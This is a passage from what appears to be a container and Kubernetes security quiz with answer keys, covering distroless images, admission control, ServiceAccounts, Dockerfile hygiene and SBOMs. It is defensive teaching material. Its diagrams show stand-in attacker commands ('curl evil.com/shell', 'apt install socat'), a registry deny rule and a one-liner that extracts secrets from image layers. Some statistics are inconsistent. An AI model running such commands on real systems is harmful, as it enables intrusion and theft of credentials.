  │  │   ✓ 123456789.dkr.ecr.us-east-1.amazonaws.com/*          │   │
  │  │   ✓ anihpj.azurecr.io/*                                  │   │
  │  │   ✗ docker.io/*           ← REJECT                       │   │
  │  │   ✗ gcr.io/*              ← REJECT                       │   │
  │  │   ✗ ghcr.io/attacker/*    ← REJECT                       │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  LAYER 2: ImagePolicyWebhook (built-in)                          │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ API server calls external webhook for EVERY image ref     │   │
  │  │ Webhook returns: ALLOW or DENY                           │   │
  │  │ (Less flexible than OPA/Kyverno — use as supplement)     │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  LAYER 3: Egress NetworkPolicy (defense-in-depth)                │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ Pods can ONLY egress to:                                 │   │
  │  │   ✓ 123456789.dkr.ecr... (your private registry)         │   │
  │  │   ✗ docker.io (blocked at network level)                 │   │
  │  │   ✗ 0.0.0.0/0 (blocked at network level)                │   │
  │  └──────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Kyverno ClusterPolicy enforces: all images must come from the private ECR registry (*.dkr.ecr.*.amazonaws.com/anihpj/*) or the distroless GCR registry (gcr.io/distroless/* — only for base images). Docker Hub, quay.io, and all other registries are rejected. The CI/CD pipeline pushes only to ECR. Attempting to deploy anihpj-api:latest from Docker Hub → Kyverno rejects with "image registry not in allowed list."

Threat Model Q144 of 200
Why does a smaller base image (distroless, alpine, scratch) improve security?
A) Fewer packages = fewer CVEs = smaller attack surface. ubuntu (~200 packages, ~100 CVEs), alpine (~30 packages, ~10 CVEs), distroless (~10 packages, ~3 CVEs), scratch (0 packages, 0 CVEs). Also: no shell, no package manager = attacker can't apt-get install malware or bash to explore. Every removed package eliminates its entire CVE history
B) Smaller images deploy faster — security is just a side benefit
C) Image size has no relationship to security — it's only about storage costs
D) Smaller images are only important for CI/CD pipeline speed
✅ Correct Answer: A

Attack surface reduction is the primary security benefit of minimal images. Every installed package is a potential vector for exploitation. ubuntu:latest includes ~200 packages — each with its own CVE history. alpine:latest cuts that to ~30 packages. distroless goes further: no shell (can't bash into the container), no package manager (can't apt-get install tools), no coreutils (can't curl/wget files). An attacker with code execution in a distroless container is FRUSTRATED — they have code execution but no tools to leverage it. scratch is the ultimate: literally nothing except your statically-compiled binary.

📝 Detailed Explanation
Image Size vs Attack Surface
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  ubuntu:22.04          alpine:3.19        distroless/python3     │
  │  ┌────────────────┐   ┌────────────┐     ┌──────────────────┐   │
  │  │ ~77 MB         │   │ ~5 MB      │     │ ~50 MB           │   │
  │  │ ~200 packages  │   │ ~30 pkgs   │     │ ~10 packages     │   │
  │  ├────────────────┤   ├────────────┤     ├──────────────────┤   │
  │  │ ✅ bash        │   │ ✅ sh      │     │ ❌ NO shell!     │   │
  │  │ ✅ curl/wget   │   │ ❌ curl    │     │ ❌ NO curl/wget  │   │
  │  │ ✅ apt-get     │   │ ✅ apk     │     │ ❌ NO pkg mgr!   │   │
  │  │ ✅ python3     │   │ ❌ python  │     │ ✅ python3       │   │
  │  │ ✅ vim, nano   │   │ ✅ vi      │     │ ❌ NO editors!   │   │
  │  │ ✅ find, grep   │   │ ✅ grep    │     │ ❌ NO coreutils  │   │
  │  ├────────────────┤   ├────────────┤     ├──────────────────┤   │
  │  │ ~100 known CVEs│   │ ~10 CVEs   │     │ ~3 CVEs          │   │
  │  │ (at any time)  │   │            │     │                  │   │
  │  └────────────────┘   └────────────┘     └──────────────────┘   │
  │                                                                  │
  │  ATTACKER IN UBUNTU:        ATTACKER IN DISTROLESS:              │
  │  "I'll apt install nmap"    "I'll apt install... wait,          │
  │  "Let me bash around..."     there IS no apt!"                   │
  │  "curl evil.com/tools"      "curl? Not installed."              │
  │                              "bash? No shell at all!"            │
  │                              "...I'm stuck." 😤                  │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: All application images use distroless nonroot base. The gunicorn container has exactly: Python 3.12 runtime + distroless CA certs (for TLS) + gunicorn + Django + application code. NO shell, NO package manager, NO curl, NO wget, NO vim. If an attacker gets RCE, they can execute Python code (limited by the application) but can't spawn a shell, download tools, or explore the filesystem with standard utilities.

Threat Model Q145 of 200
What is a "distroless" image and why should you use it?
A) A distroless image removes the Linux kernel — it runs directly on hardware
B) Google's distroless images contain ONLY your application and its LANGUAGE RUNTIME. NO shell, NO package manager, NO coreutils. If an attacker gets code execution, they: can't apt-get install malware, can't bash to explore filesystem, can't curl/wget to download tools, can't find SUID binaries because none exist. Combined with readOnlyRootFilesystem, the attacker has code execution but ZERO tools to leverage it
C) Distroless images are unmaintained — they're deprecated in favor of Alpine
D) Distroless images include extra debugging tools for production troubleshooting
✅ Correct Answer: B

Distroless is Google's answer to "what's the smallest possible image that still runs my app?" It includes ONLY: your application's language runtime (Python, Java, Node, Go — statically linked), CA certificates (for TLS), and timezone data. NO shell (/bin/sh doesn't exist), NO package manager, NO coreutils, NO editors. This is security through minimalism: if the tool isn't there, the attacker can't use it. For debugging, you use kubectl debug with an ephemeral container that HAS tools, rather than including them in the production image.

📝 Detailed Explanation
Distroless — Security Through Minimalism
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  STANDARD IMAGE:                    DISTROLESS IMAGE:             │
  │  ┌──────────────────────────┐      ┌──────────────────────────┐  │
  │  │ FROM python:3.12-slim     │      │ FROM gcr.io/distroless/ │  │
  │  │                          │      │   python3-debian12:nonroot│  │
  │  ├──────────────────────────┤      ├──────────────────────────┤  │
  │  │ /bin/bash       ✓        │      │ /bin/bash       ✗        │  │
  │  │ /bin/sh         ✓        │      │ /bin/sh         ✗        │  │
  │  │ /usr/bin/curl   ✓        │      │ /usr/bin/curl   ✗        │  │
  │  │ /usr/bin/wget    ✓       │      │ /usr/bin/wget    ✗       │  │
  │  │ /usr/bin/apt-get ✓       │      │ /usr/bin/apt-get ✗       │  │
  │  │ /usr/bin/vim     ✓       │      │ /usr/bin/vim     ✗       │  │
  │  │ /usr/bin/ssh     ✓       │      │ /usr/bin/ssh     ✗       │  │
  │  │ /usr/bin/gcc     ✓       │      │ /usr/bin/gcc     ✗       │  │
  │  │                          │      │                          │  │
  │  │ python3          ✓       │      │ python3          ✓       │  │
  │  │ ca-certificates  ✓       │      │ ca-certificates  ✓       │  │
  │  │ tzdata           ✓       │      │ tzdata           ✓       │  │
  │  │                          │      │                          │  │
  │  │ ATTACKER:                 │      │ ATTACKER:                │  │
  │  │ $ bash → shell!           │      │ $ bash → bash: not found │  │
  │  │ $ apt install socat       │      │ $ apt → apt: not found   │  │
  │  │ $ curl evil.com/shell     │      │ $ curl → curl: not found │  │
  │  └──────────────────────────┘      └──────────────────────────┘  │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The production images use gcr.io/distroless/python3-debian12:nonroot. The nonroot variant runs as UID 1000 (not root!). If attackers achieve RCE via a deserialization vulnerability: they can execute Python code (within Django's process), but they cannot: spawn a shell, install netcat, download a reverse shell, or compile an exploit. For production debugging: kubectl debug -it anihpj-api-xxx --image=python:3.12-slim --target=anihpj-api (ephemeral container with tools, never in the production image).

4.7 Privilege EscalationQ146–Q148

Threat Model Q146 of 200
How does the Kubernetes API server enforce controls for every request?
A) The API server trusts all internal traffic — only external requests are checked
B) A single "security check" validates the request — pass/fail at one gate
C) Every request goes through 3 sequential stages: ① Authentication (validate certificate/token — WHO is this?), ② Authorization (check RBAC — CAN they do this action?), ③ Admission Control (apply policies — SHOULD we allow this specific resource?). ALL 3 stages must pass. If ANY stage fails → request DENIED immediately
D) Only write operations are checked — reads (GET requests) bypass all security
✅ Correct Answer: C

The API server's request pipeline is a three-gate security checkpoint. Authentication answers "Who are you?" by validating certificates, tokens, or OIDC claims. Authorization answers "Can you do this?" by checking RBAC rules. Admission Control answers "Should we allow this?" by running mutating and validating webhooks (Pod Security Standards, OPA policies, resource quotas). If authentication fails → 401 Unauthorized. If authorization fails → 403 Forbidden. If admission fails → request rejected with specific policy violation message. Every request, including GETs, goes through all three gates.

📝 Detailed Explanation
API Server Request Pipeline — Three Security Gates
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  kubectl create -f pod.yaml                                      │
  │       │                                                          │
  │       ▼                                                          │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ GATE 1: AUTHENTICATION ("Who are you?")                   │   │
  │  │ • Validate X.509 cert OR JWT token OR OIDC claim         │   │
  │  │ • Extract username + groups                              │   │
  │  │ • FAIL → 401 Unauthorized                                │   │
  │  └────────────────────────┬─────────────────────────────────┘   │
  │                           │ PASS                                │
  │                           ▼                                      │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ GATE 2: AUTHORIZATION ("Can you create pods?")            │   │
  │  │ • Iterate ALL RoleBindings + ClusterRoleBindings          │   │
  │  │ • Find matching subject → check verbs + resources         │   │
  │  │ • ANY matching rule allows → PASS                         │   │
  │  │ • NO matching rule → 403 Forbidden                        │   │
  │  └────────────────────────┬─────────────────────────────────┘   │
  │                           │ PASS                                │
  │                           ▼                                      │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ GATE 3: ADMISSION CONTROL ("Should we allow this pod?")   │   │
  │  │ • Mutating webhooks: modify request (add sidecar, labels) │   │
  │  │ • Validating webhooks: check policies                    │   │
  │  │   - Pod Security Standards: runAsNonRoot? drop ALL caps?  │   │
  │  │   - OPA/Kyverno: image from allowed registry?            │   │
  │  │   - ResourceQuota: within namespace limits?              │   │
  │  │ • ALL validations pass → pod CREATED                     │   │
  │  │ • ANY validation fails → REJECTED with explanation       │   │
  │  └──────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The three-gate pipeline is configured as: Authentication via OIDC (human operators) + bound SA tokens (pods). Authorization via least-privilege RBAC (dedicated Roles per namespace). Admission via Pod Security Admission (restricted), Kyverno (image signing + registry allowlist + require labels), and ResourceQuota. Every kubectl command and API call passes through all three. There is no "trusted path" — the API server treats all requests equally.

Threat Model Q147 of 200
What is the "assume breach" mentality and how does it change security design?
A) "Assume breach" means designing your system so that even WHEN (not if) an attacker gets in, the damage is contained, detected, and recoverable. It's the opposite of perimeter-only security. Key shift: every control is designed for the scenario "an attacker is already inside this pod/namespace" — NetworkPolicy limits lateral movement, RBAC prevents privilege escalation, Falco detects anomalous behavior, audit logs provide forensic evidence, backups enable recovery
B) It means you should intentionally breach your own cluster weekly for practice
C) "Assume breach" means giving up on prevention and focusing only on detection
D) It means assuming the cloud provider's infrastructure has been breached
✅ Correct Answer: A

"Assume breach" transforms security from "keep them out" (perimeter) to "when they get in, what then?" (defense-in-depth). Every security decision starts with: "If an attacker is in THIS pod right now, what can they do? How do I limit that?" The result: networks default to deny (not allow), RBAC defaults to no permissions (not cluster-admin), pods run as non-root with no capabilities, and everything is monitored. This design philosophy acknowledges that prevention alone is insufficient — determined attackers WILL find a way in. The question is whether they can DO anything once inside.

📝 Detailed Explanation
Assume Breach — Design Consequences
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  PERIMETER MENTALITY:           ASSUME BREACH MENTALITY:         │
  │  "We have a firewall + auth"    "They're already inside."        │
  │                                                                  │
  │  DESIGN CHOICES:                DESIGN CHOICES:                  │
  │  ┌──────────────────────┐      ┌──────────────────────────┐     │
  │  │ Network: allow-all   │      │ Network: default-deny    │     │
  │  │ RBAC: broad roles    │      │ RBAC: least privilege    │     │
  │  │ Pods: root by default│      │ Pods: non-root, drop ALL │     │
  │  │ No runtime detection │      │ Falco watching everything│     │
  │  │ No audit logging     │      │ Full audit trail        │     │
  │  │ No backup strategy   │      │ etcd snapshots every 4h │     │
  │  │                      │      │                          │     │
  │  │ RESULT:                 │      │ RESULT:                   │     │
  │  │ Breach → TOTAL LOSS    │      │ Breach → contained,       │     │
  │  │ "How did this happen?" │      │ detected, investigated,   │     │
  │  │ (No logs to check)     │      │ recovered within hours    │     │
  │  └──────────────────────┘      └──────────────────────────┘     │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The security architecture assumes an attacker has already compromised the web pod. Every control is validated against this scenario: "With web pod compromised, can the attacker... read Secrets? (No — SA has no API access). Access the database directly? (No — NetworkPolicy blocks web→db). Exfiltrate data? (No — egress NP blocks internet). Move to other namespaces? (No — RBAC is namespace-scoped)." The security team runs quarterly "assume breach" tabletop exercises to validate these assumptions.

Threat Model Q148 of 200
Why should you never use the "default" ServiceAccount in every namespace?
A) The default SA is the most secure — it has no permissions by default
B) The default SA is automatically rotated — using it ensures credential freshness
C) The default SA is deprecated and will be removed in future Kubernetes versions
D) The default SA is auto-mounted in every pod (unless disabled). If ALL pods share ONE ServiceAccount, compromise of ANY pod gives the attacker the SAME permissions — and access to every other pod using that SA. Create dedicated SAs per workload with minimal, scoped RBAC. Set automountServiceAccountToken: false for pods that don't need API access at all
✅ Correct Answer: D

The default ServiceAccount is a shared identity automatically mounted in every pod that doesn't specify a different SA. This creates a dangerous situation: if any RBAC permissions are bound to the default SA (even accidentally), ALL pods that use it inherit those permissions. A compromised logging sidecar could gain the same API access as your application. Best practice: never bind RBAC to the default SA. Create dedicated SAs per workload with exactly the permissions needed. For pods that don't need API access (most application pods!), set automountServiceAccountToken: false.

📝 Detailed Explanation
Default SA — The Shared Identity Problem
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  ❌ BAD: All pods share default SA                               │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ Namespace: anihpj                                         │   │
  │  │                                                           │   │
  │  │ default SA: bound to "pod-reader" Role                   │   │
  │  │                                                           │   │
  │  │ ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │   │
  │  │ │anihpj-web│  │anihpj-api│  │anihpj-db │  │ logging  │  │   │
  │  │ │SA:default│  │SA:default│  │SA:default│  │SA:default│  │   │
  │  │ └──────────┘  └──────────┘  └──────────┘  └──────────┘  │   │
  │  │       ↑            ↑            ↑            ↑          │   │
  │  │       └────────────┴────────────┴────────────┘          │   │
  │  │          ALL pods have SAME permissions!                 │   │
  │  │          Compromise logging sidecar → can list ALL pods  │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  ✅ GOOD: Dedicated SAs per workload + automount off             │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │   │
  │  │ │anihpj-web│  │anihpj-api│  │anihpj-db │  │ logging  │  │   │
  │  │ │SA:none   │  │SA:none   │  │SA:none   │  │SA:log-sa│  │   │
  │  │ │autoOff ✓ │  │autoOff ✓ │  │autoOff ✓ │  │(read logs│  │   │
  │  │ │          │  │          │  │          │  │ only)    │  │   │
  │  │ └──────────┘  └──────────┘  └──────────┘  └──────────┘  │   │
  │  │   NO API      NO API      NO API      Only log access  │   │
  │  │   access      access      access      (scoped)          │   │
  │  └──────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The web, api, and db pods all have automountServiceAccountToken: false — no SA token, no API access. The logging sidecar has a dedicated SA (log-reader) with permissions scoped ONLY to read pod logs in the anihpj namespace. The CI/CD deployer has a dedicated SA (deployer) with permissions ONLY to update Deployments. No pod uses the default SA, and no RBAC is bound to it. Compromise of any pod = zero Kubernetes API access (except the logging sidecar, which is limited to logs).

🔐 Category 5: Platform Security (16%)Q149-Q180

🟣 Advanced: Securing the Platform Itself

This category covers supply chain integrity, image repositories, observability & runtime monitoring, service mesh security, PKI infrastructure, network connectivity, and admission control — the "DevSecOps" category where security is integrated into every stage of the application lifecycle.

Q149-Q180 32 Questions 🟣 Advanced

5.1 Supply Chain SecurityQ149–Q154

Platform Security Q149 of 200
What is a multi-stage Docker build and how does it improve security?
A) Running multiple containers simultaneously for high availability
B) Building the same image multiple times to ensure reproducibility
C) Stage 1 (BUILDER): full development image with compilers, dev dependencies, and build tools — build the application here. Stage 2 (RUNTIME): minimal image (distroless or scratch) — copy ONLY the compiled artifacts from Stage 1. Result: compilers, dev tools, source code, and build dependencies NEVER appear in production. Attacker can't use gcc/git/pip because they don't exist in the final image
D) Building images for multiple CPU architectures (amd64, arm64) simultaneously
✅ Correct Answer: C

Multi-stage builds separate the "build" environment from the "runtime" environment. Stage 1 uses a full-featured image with compilers (gcc, g++), dev dependencies (pip, npm), and build tools (make, git). Stage 2 uses a minimal base (distroless or scratch) and copies ONLY the compiled artifacts. The security benefit: development tools NEVER appear in the production image. If an attacker gets RCE, they can't compile exploits (no gcc), install packages (no pip), or clone repos (no git). Combined with distroless (no shell, no package manager), the production image is a hostile environment for attackers.

📝 Detailed Explanation
Multi-Stage Build — Separate Build from Runtime
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  STAGE 1: BUILDER (python:3.12 — full image)                     │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ ✓ gcc, g++, make (compilers)                             │   │
  │  │ ✓ git (source control)                                    │   │
  │  │ ✓ pip, setuptools (package managers)                     │   │
  │  │ ✓ dev headers (python3-dev, libpq-dev)                   │   │
  │  │ ✓ All 200 packages from python:3.12                     │   │
  │  │                                                          │   │
  │  │ WORK: COPY requirements.txt .                            │   │
  │  │       RUN pip install --user -r requirements.txt         │   │
  │  │       COPY . .                                           │   │
  │  │       RUN pip install --user .                           │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                          │                                       │
  │                          │ COPY ONLY: /root/.local (pip pkgs)    │
  │                          │            /app (application code)    │
  │                          ▼                                       │
  │  STAGE 2: RUNTIME (gcr.io/distroless/python3:nonroot)            │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ ✓ python3 (runtime only)                                 │   │
  │  │ ✓ ca-certificates (TLS)                                  │   │
  │  │ ✓ Application code + pip packages (from Stage 1)         │   │
  │  │                                                          │   │
  │  │ ✗ gcc, make, git (NOT copied — not in production!)       │   │
  │  │ ✗ python3-dev headers (NOT copied)                      │   │
  │  │ ✗ pip, setuptools (NOT copied)                          │   │
  │  │ ✗ Shell, curl, wget (NOT in distroless!)                │   │
  │  └──────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The Dockerfile uses multi-stage builds: Stage 1 (python:3.12-slim-bullseye) installs gcc + libpq-dev + builds psycopg2 and other C-extension dependencies via pip. Stage 2 (distroless/python3-debian12:nonroot) copies ONLY the installed packages and application code from Stage 1. The final image is ~120MB (vs ~900MB if single-stage) and contains ZERO build tools. If an attacker gets RCE, they can't compile a kernel exploit or install malicious Python packages.

Platform Security Q150 of 200
How do you ensure no secrets leak into Docker image layers?
A) Secrets leaked into image layers are PERMANENT (even if deleted in later RUN — the earlier layer still exists). Solutions: ① .dockerignore (exclude .env, secrets/, *.key), ② BuildKit secret mounts: RUN --mount=type=secret,id=mysecret (secret is available ONLY during that RUN, NOT in the image layer), ③ Multi-stage builds (copy only artifacts, not build environment), ④ NEVER COPY secrets into the build context at all — inject at runtime via volumes/env
B) Just delete the secret file in a later RUN command — that removes it from the image
C) Use .gitignore — it also prevents files from being added to Docker images
D) Docker automatically strips secrets from image layers — no action needed
✅ Correct Answer: A

The Docker layer model is the fundamental problem: each RUN/COPY/ADD instruction creates a new layer. If you COPY a secret file in layer 3 and then RUN rm secret.txt in layer 4 — the secret STILL EXISTS in layer 3! Anyone with access to the image can extract it: docker save image | tar x and inspect every layer. The solution is BuildKit secret mounts: RUN --mount=type=secret,id=github-token makes the secret available during that RUN command only — it's NEVER stored in any layer. The secret is passed at build time and disappears after the build.

📝 Detailed Explanation
Secret Leakage in Image Layers — The Permanent Problem
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  ❌ WRONG: Deleted secret still exists in earlier layer          │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ Layer 1: FROM python:3.12                                │   │
  │  │ Layer 2: COPY . .          ← .env file copied here!      │   │
  │  │ Layer 3: RUN pip install -r requirements.txt             │   │
  │  │ Layer 4: RUN rm .env       ← "Deleted" — but still in    │   │
  │  │                                 Layer 2! 💥              │   │
  │  │                                                          │   │
  │  │ $ docker save image:tag | tar xO | grep SECRET_KEY      │   │
  │  │ → SECRET_KEY=abc123def456... FOUND in Layer 2!           │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  ✅ CORRECT: BuildKit secret mount — never in any layer          │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ # syntax=docker/dockerfile:1                              │   │
  │  │ RUN --mount=type=secret,id=django-secret-key \           │   │
  │  │     export SECRET_KEY=$(cat /run/secrets/django-secret-key)│   │
  │  │     && python manage.py collectstatic                    │   │
  │  │                                                          │   │
  │  │ Build: docker build --secret id=django-secret-key,src=.env│   │
  │  │                                                          │   │
  │  │ Result: Secret available during build ONLY               │   │
  │  │         NOT stored in ANY image layer ✓                  │   │
  │  └──────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The CI/CD pipeline uses BuildKit with secret mounts for ALL build-time secrets. The .dockerignore explicitly excludes .env, *.key, *.pem, secrets/, and credentials/. The production deployment injects secrets at runtime via External Secrets Operator → mounted Secret volumes (not env vars, not build-time). A security audit verifies that no image in the registry contains secrets by running trufflehog filesystem against extracted image layers in the pipeline.

Platform Security Q151 of 200
What is an SBOM (Software Bill of Materials) and how does it improve supply chain security?
A) A security scanner that automatically patches vulnerabilities in container images
B) A machine-readable inventory listing EVERY component, library, and dependency in a software artifact — including transitive dependencies, versions, licenses, and known vulnerabilities. SBOMs enable: ① Rapid identification of affected systems when a CVE is announced (e.g., Log4Shell — grep SBOM for log4j, not search 10,000 containers manually), ② License compliance auditing (catch GPL-incompatible deps before they reach production), ③ Supply chain integrity verification (does the deployed image match the attested SBOM?), ④ Regulatory compliance (Executive Order 14028 mandates SBOMs for federal software)
C) A Kubernetes operator that enforces image signing policies at admission time
D) A build cache optimization technique that speeds up Docker image creation
✅ Correct Answer: B

An SBOM (Software Bill of Materials) is a nested inventory of every software component in a product — like a nutrition label but for code. It lists direct dependencies AND transitive dependencies (dependencies of dependencies), each with version, supplier, license, and known CVE data. The security value is incident response speed: without SBOMs, when Log4Shell (CVE-2021-44228) hit, organizations spent weeks manually searching every application for log4j. With SBOMs, they could grep one JSON file and know within minutes. Formats: SPDX (ISO 5962) and CycloneDX (OWASP). Tools: Syft, Trivy, Docker SBOM CLI. Regulatory driver: U.S. Executive Order 14028 requires SBOMs for all software sold to the federal government.

📝 Detailed Explanation
SBOM — The Nutrition Label for Your Software Supply Chain
  ┌──────────────────────────────────────────────────────────────────────────────┐
  │                         SBOM WORKFLOW — KNOW WHAT'S INSIDE                     │
  ├──────────────────────────────────────────────────────────────────────────────┤
  │                                                                              │
  │  WITHOUT SBOM (Before Log4Shell)             WITH SBOM (After Log4Shell)     │
  │  ┌────────────────────────────────────┐      ┌──────────────────────────────┐│
  │  │ "Does our app use log4j?"          │      │ $ syft anihpj-web:v2.1       ││
  │  │ "I don't know... check 300 repos"  │      │ ┌──────────────────────────┐ ││
  │  │ "Also check transitive deps..."    │      │ │ django==4.2      (direct) │ ││
  │  │                                    │      │ │ psycopg2==2.9    (direct) │ ││
  │  │  ┌────────────────────────────┐    │      │ │ requests==2.31  (direct) │ ││
  │  │  │ WEEKS of manual searching  │    │      │ │ urllib3==2.0    (trans.)  │ ││
  │  │  │ Thousands of person-hours  │    │      │ │ certifi==2023.7 (trans.)  │ ││
  │  │  │ Attackers exploit window   │    │      │ │ log4j-core==2.17 ⚠️CVE   │ ││
  │  │  └────────────────────────────┘    │      │ │ ... 147 packages total   │ ││
  │  └────────────────────────────────────┘      │ └──────────────────────────┘ ││
  │                                              │                              ││
  │  SBOM FORMATS:                               │ $ grype sbom.json            ││
  │  ┌──────────────────────┬──────────────────┐ │ ┌──────────────────────────┐ ││
  │  │  SPDX (ISO 5962)     │ CycloneDX (OWASP)│ │ │ CRITICAL: CVE-2021-44228 │ ││
  │  │  Linux Foundation     │ OWASP Foundation │ │ │ Package: log4j-core      │ ││
  │  │  JSON, YAML, Tag:Value│ JSON, XML        │ │ │ Fixed in: 2.17.1         │ ││
  │  └──────────────────────┴──────────────────┘ │ └──────────────────────────┘ ││
  │                                              └──────────────────────────────┘│
  │                                                                              │
  │  SBOM LIFECYCLE:  Generate (syft/trivy) → Sign (cosign) → Attest → Verify   │
  └──────────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Every image build generates an SBOM using Syft: syft anihpj-web:v2.1 -o spdx-json > sbom-web.spdx.json. The SBOM captures all 147 Python packages (direct + transitive), their versions, licenses, and CVE status. It's signed with Cosign and stored alongside the image in the registry. When a critical CVE is announced (like the 2024 xz-utils backdoor CVE-2024-3094), the CI pipeline greps all SBOMs and alerts within seconds — instead of manually searching every container in the 6-cluster lab. SBOMs are also checked during admission: Kyverno verifies that every deployed image has a signed SBOM attestation before it's allowed to run.

Platform Security Q152 of 200
In the anihpj/jobpost Dockerfile, what are the key security practices?
A) Use :latest tag for all base images — it's always the most recent and secure
B) Include all build tools in the final image so you can debug production issues
C) ① FROM python:3.12-slim@sha256:abc... (PIN digest, not tag), ② Multi-stage: builder → distroless runtime, ③ USER 1000:1000 (non-root), ④ COPY requirements.txt BEFORE COPY . (layer caching — dependency changes rare, code changes frequent), ⑤ NEVER COPY .env or secrets — use BuildKit secret mounts: RUN --mount=type=secret,id=django-secret-key, ⑥ .dockerignore: exclude .git/, *.pyc, __pycache__, .env, venv/, *.log
D) Use a single-stage build with ubuntu:latest for maximum compatibility
✅ Correct Answer: C

anihpj/jobpost's Dockerfile follows defense-in-depth at build time. Pinning by digest ensures the exact same base image is used every build (tags are mutable). Multi-stage keeps compilers out of production. Non-root USER prevents container-as-root attacks. Layer ordering (requirements.txt before source code) leverages Docker's layer cache — dependencies are reinstalled only when requirements.txt changes, not on every code commit. BuildKit secret mounts prevent secrets from leaking into image layers (even if deleted later, they persist in earlier layers). .dockerignore prevents accidental inclusion of sensitive files.

📝 Detailed Explanation
Dockerfile Security — The Secure Build Pattern
  ┌──────────────────────────────────────────────────────────────────────┐
  │  SECURE DOCKERFILE PATTERN (anihpj/jobpost)                          │
  ├──────────────────────────────────────────────────────────────────────┤
  │                                                                      │
  │  # syntax=docker/dockerfile:1                                        │
  │  FROM python:3.12-slim@sha256:abc123... AS builder   ← PIN DIGEST   │
  │                                                                      │
  │  COPY requirements.txt .                    ← CACHED (rarely changes)│
  │  RUN pip install --user -r requirements.txt ← CACHED (if req.txt ok)│
  │  COPY . .                                   ← REBUILT (every commit) │
  │                                                                      │
  │  FROM gcr.io/distroless/python3:nonroot ← DISTROLESS (no shell/pkg) │
  │  COPY --from=builder /root/.local /root/.local ← ONLY runtime deps  │
  │  COPY --from=builder /app /app                                     │
  │  USER 1000:1000                            ← NON-ROOT USER          │
  │  CMD ["gunicorn", "anihpj.wsgi:application"]                        │
  │                                                                      │
  ├──────────────────────────────────────────────────────────────────────┤
  │  6 SECURITY PRACTICES IN ACTION:                                     │
  │                                                                      │
  │  ① DIGEST PINNING:  sha256:abc... → ALWAYS same base image          │
  │  ② MULTI-STAGE:     compiler tools NEVER reach production           │
  │  ③ DISTROLESS:       no shell, no apt → attacker stuck              │
  │  ④ NON-ROOT USER:    UID 1000 → no root privileges                  │
  │  ⑤ LAYER ORDERING:   req.txt BEFORE code → pip install cached      │
  │  ⑥ BUILDER SECRETS:  --mount=type=secret → never in layers         │
  └──────────────────────────────────────────────────────────────────────┘
USER 1000:1000 ← Non-root (already in base) CMD ["gunicorn", "anihpj.wsgi:application"] ← No shell needed BUILD: docker build --secret id=django-key,src=.env . ↑ Secret available ONLY during build, NOT in any image layer

For anihpj/jobpost: This exact Dockerfile pattern is used for all images (web, api, celery worker). The CI/CD pipeline enforces: must use distroless base, must use multi-stage, must have USER != root, must pass hadolint with no warnings. A Dockerfile that violates any rule is rejected at PR review time.

Platform Security Q153 of 200
What is the vulnerability difference between alpine:latest and distroless base images?
A) Alpine is more secure because it's smaller than ubuntu — distroless adds unnecessary packages
B) Trivy scan comparison for a Python app: alpine/python3.12 (~30 packages, ~15 CVEs with several HIGH/CRITICAL), distroless/python3 (~10 packages, ~5 CVEs mostly MEDIUM), scratch/static binary (0 packages, 0 CVEs). The trend: fewer packages = fewer CVEs. Distroless removes the OS "userland" (shell, coreutils, package manager) while keeping essential runtime libraries (libc, libssl, ca-certificates)
C) Alpine and distroless have the same number of CVEs — they're both minimal images
D) Vulnerability count doesn't matter if you have Falco running at runtime
✅ Correct Answer: B

The math is simple: every installed package is a potential CVE. Alpine (~30 packages) has roughly 3× more packages than distroless (~10 packages), which translates to ~3× more CVEs. Distroless removes the OS "userland" entirely — no shell, no coreutils, no package manager. But it keeps essential runtime libraries (libc for system calls, libssl for TLS, ca-certificates for trust). The ultimate minimal image is scratch (0 packages, 0 CVEs) — but only works with statically compiled Go/Rust binaries. Python needs libc and libssl, so distroless is the practical minimum.

📝 Detailed Explanation
Image Vulnerability by Package Count
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  ubuntu:22.04        alpine:3.19         distroless/python3     │
  │  ┌──────────────┐   ┌──────────────┐    ┌──────────────────┐   │
  │  │ ~200 packages│   │ ~30 packages │    │ ~10 packages     │   │
  │  │ ~100+ CVEs  │   │ ~15 CVEs     │    │ ~5 CVEs          │   │
  │  │             │   │   (3 HIGH,    │    │   (1 MEDIUM)     │   │
  │  │             │   │    1 CRIT)    │    │                  │   │
  │  ├──────────────┤   ├──────────────┤    ├──────────────────┤   │
